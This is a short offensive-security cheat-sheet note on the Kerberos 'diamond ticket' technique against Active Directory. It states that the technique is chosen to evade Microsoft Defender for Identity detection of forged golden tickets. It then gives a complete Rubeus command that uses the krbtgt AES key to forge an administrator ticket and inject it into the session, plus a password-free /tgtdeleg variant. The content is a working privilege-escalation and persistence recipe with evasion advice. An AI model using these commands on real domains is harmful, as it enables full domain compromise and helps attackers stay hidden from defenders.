- When we forge a `diamont ticket`, there is no pre-auth request corresponding to the forged ticket. This is an anomaly and can be detected by MDIs.
- To bypass this, we can request a TGT, decrypt it, modify if, then re-encrypt it, using the AES keys of the `krbtgt` account.
- Diamond ticket is the opsec safe version of the golden ticket.
### Rubeus
```powershell
Rubues.exe diamond
	/krbkey:<aes-key> # krbtgt aes account
	/user:<username> # user to use for as-req
	/password:<password> # password for the user to use for as-req
	/enctype:aes
	/ticketuser:administrator # user to create forged ticket for
	/domain:<domain-fqdn> # fqdn of the domain
	/dc:<dc-fqdn> # fqdn of the domain controller
	/ticketuserID # impersonated user ID, RID of administrator
	/groups
	/createnetonly:C\windows\system32\cmd.exe # logon type 9, only net requests.
	/show
	/ptt
	# instead of the passsing username & password, we can use
	/tgtdeleg # this will use the current user, and does not require password
```